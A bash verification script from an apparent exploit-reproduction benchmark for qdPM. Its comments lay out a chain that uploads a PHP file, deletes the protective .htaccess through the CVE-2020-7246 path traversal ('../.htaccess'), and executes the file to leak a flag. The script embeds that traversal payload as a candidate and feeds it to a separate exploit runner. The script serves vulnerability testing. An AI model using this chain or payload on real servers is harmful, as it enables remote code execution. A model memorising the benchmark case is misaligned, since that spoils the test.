#!/usr/bin/env bash
# verify.sh --seed|--residual — qdpm-cve-2020-7246 (PCBV2-0181)
#
# 机制：qdPM 成员 myAccount 照片上传保留原始扩展名并落在 uploads/users/；
#       CVE-2015-3884 缓解 = uploads/.htaccess 脚本拦截（.php 不能直接执行）。
#   seed     = CVE-2015-3884 原形：上传 .php 后直接 GET /uploads/users/<f>。
#              V0(qdPM 9.1, uploads .htaccess 被 neutralise, STRIP_UPLOAD_HTACCESS=1)
#              -> 直接执行 -> /flag/pcb_flag.txt 泄出
#              V1(qdPM 9.1 原装, .htaccess 生效) -> 403 -> 阻断
#   residual = CVE-2020-7246 残留：myAccount 删除照片分支 unlink(sf_upload_dir.'/users/'.
#              photo_preview) 路径穿越（photo_preview="../.htaccess"），先删掉保护性
#              .htaccess，再 GET 上传的 .php -> 执行 -> flag 泄出。
#              V1(9.1) unlink 无 app::is_image 守卫 -> 达效果；V2(9.2) is_image 拦上传+unlink -> 阻断
# 效果通道 = GET /uploads/users/<f>.php 响应 body（执行后回显容器内 $PCB_FLAG）。
# residual candidate 内嵌字面量（mode=htaccess_X 与平台 poc/seed_exec.py 契约一致；
#           仅驱动 seed_exec，不引用 _heldout/）。判定与 seed 共用 fetched_body 含 flag。
# 退出码：0=效果发生(flag 出现) 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR" 2>/dev/null || true

# 动态端口优先（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-80}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
PORT="${_DYN:-}"
export PCB_TARGET_PORT="${PORT:-}"

# 就绪等待：qdPM 冷启动要跑自身 installer（等 db + install + 种 member 账号），
# 以“member 登录 + myAccount 表单可载”为就绪（与 poc/seed_exec.py _login 同判据）
if [[ -z "$PORT" ]]; then
  [[ "$VERSION" == "v1" ]] && PORT=39451 || PORT=39450
fi
"$PY" - "$PORT" <<'PYEOF' || { echo "readiness probe failed on port $PORT" >&2; exit 20; }
import http.cookiejar, re, sys, time, urllib.parse, urllib.request
port = sys.argv[1]
base = "http://127.0.0.1:%s" % port
USER, PW = "poc@pcb.local", "pocpass"
deadline = time.time() + 300
while time.time() < deadline:
    try:
        cj = http.cookiejar.CookieJar()
        op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
        r = op.open(base + "/index.php/login/index", timeout=10)
        html = r.read().decode("utf-8", "replace")
        m = re.search(r'name="login\[_csrf_token\]"[^>]*value="([^"]*)"', html) \
            or re.search(r'value="([^"]*)"[^>]*name="login\[_csrf_token\]"', html)
        data = {"login[email]": USER, "login[password]": PW}
        if m:
            data["login[_csrf_token]"] = m.group(1)
        req = urllib.request.Request(base + "/index.php/login/index",
                                     data=urllib.parse.urlencode(data).encode())
        op.open(req, timeout=10).read()
        ma = op.open(base + "/index.php/myAccount/index", timeout=10)
        if b'id="users"' in ma.read():
            sys.exit(0)
    except Exception:
        pass
    time.sleep(4)
sys.exit(1)
PYEOF

# 候选：seed = 直接请求执行（original_poc）；residual = CVE-2020-7246 穿越删 .htaccess
if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  if [[ -z "$CAND" ]]; then
    echo "verify: original_poc.py produced no output" >&2
    exit 20
  fi
else
  CAND='{"probe_id": "cve-2020-7246-photo-preview-traversal-htaccess-delete", "mode": "htaccess_X", "filename": "pcb_bypass.php", "traversals": [".htaccess", "../.htaccess"]}'
fi
printf '%s' "$CAND" > "$WORK_DIR/cand.json"

OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 500; echo
"$PY" -c "import json,sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
body = str(d.get('body') or d.get('fetched_body') or d.get('resp') or d.get('response') or d.get('location') or '')
sys.exit(0 if '$RUN_FLAG' in body else 10)" "$OUT"
